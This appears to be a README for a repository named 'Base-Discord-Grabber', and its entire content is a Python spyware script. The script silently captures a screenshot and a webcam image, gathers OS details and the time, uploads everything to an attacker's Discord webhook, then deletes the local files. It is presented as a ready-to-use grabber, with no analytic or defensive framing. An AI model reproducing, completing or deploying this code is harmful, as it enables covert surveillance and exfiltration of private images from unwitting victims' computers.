# Base-Discord-Grabber

The Code

import platform
import datetime
import subprocess
import cv2
import pyautogui
import requests
import os
from discord_webhook import DiscordWebhook

def capture_screen():
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

def capture_webcam_image():
    # Open the default camera (usually the built-in webcam)
    cap = cv2.VideoCapture(0)

    # Check if the camera opened successfully
    if not cap.isOpened():
        print("Error: Could not open camera.")
        return None

    # Capture frame-by-frame
    ret, frame = cap.read()

    # If frame is read correctly, save it as image
    if ret:
        cv2.imwrite("webcam_image.jpg", frame)
        print("Webcam image captured successfully.")

    # Release the camera
    cap.release()
    cv2.destroyAllWindows()
    return "webcam_image.jpg"

def get_system_info():
    os_info = platform.platform()
    return os_info

def get_current_time():
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return current_time

def send_discord_message(message, screenshot_path, webcam_image_path, webhook_url):
    current_time = get_current_time()
    os_info = get_system_info()
    message_content = f"Time: {current_time}\nOS: {os_info}"
    
    files = {'file': open(screenshot_path, 'rb'), 'webcam_image': open(webcam_image_path, 'rb')}
    data = {'content': message_content}
    
    response = requests.post(webhook_url, data=data, files=files)
    return response

def main():
    webhook_url = "WEBHOOK HERE"
    screenshot_path = capture_screen()
    webcam_image_path = capture_webcam_image()
    
    response = send_discord_message("Screenshot and webcam image captured!", screenshot_path, webcam_image_path, webhook_url)
    
    if response.status_code == 200:
        print("Message sent successfully")
    else:
        print("Failed to send message")

    # Remove the temporary files after sending
    os.remove(screenshot_path)
    if webcam_image_path:
        os.remove(webcam_image_path)


